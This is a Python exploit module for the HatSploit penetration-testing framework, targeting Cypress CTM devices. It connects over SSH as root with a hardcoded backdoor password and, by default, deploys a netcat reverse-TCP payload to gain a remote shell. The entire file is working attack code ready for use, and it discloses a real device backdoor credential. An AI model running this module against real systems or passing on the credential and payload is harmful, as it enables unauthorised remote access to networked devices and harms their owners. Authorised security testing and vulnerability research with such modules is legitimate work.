#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import paramiko

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, Handler):
    details = {
        'Name': "Cypress CTM SSH backdoor password",
        'Module': "exploit/linux/cypress/ctm_backdoor_password",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Remote code execution through SSH backdoor in Cypress CTM devices.",
        'Comments': [
            ''
        ],
        'Platform': "linux",
        'Rank': "high"
    }

    payload = {
        'Value': "unix/generic/netcat_reverse_tcp",
        'Categories': None,
        'Architectures': [
            'armle',
            'aarch64',
            'generic'
        ],
        'Platforms': [
            'linux',
            'unix'
        ],
        'Types': None
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 22,
            'Type': "port",
            'Required': True
        },
        'USERNAME': {
            'Description': "Shell username.",
            'Value': "root",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(remote_host, port=remote_port, username=username, password='Chameleon')
        except Exception:
            self.print_error("Target is not vulnerable!")

            self.print_error("Exploit failed!")
            return

        self.handle_session(
            host=remote_host,
            sender=client.exec_command
        )

        client.close()
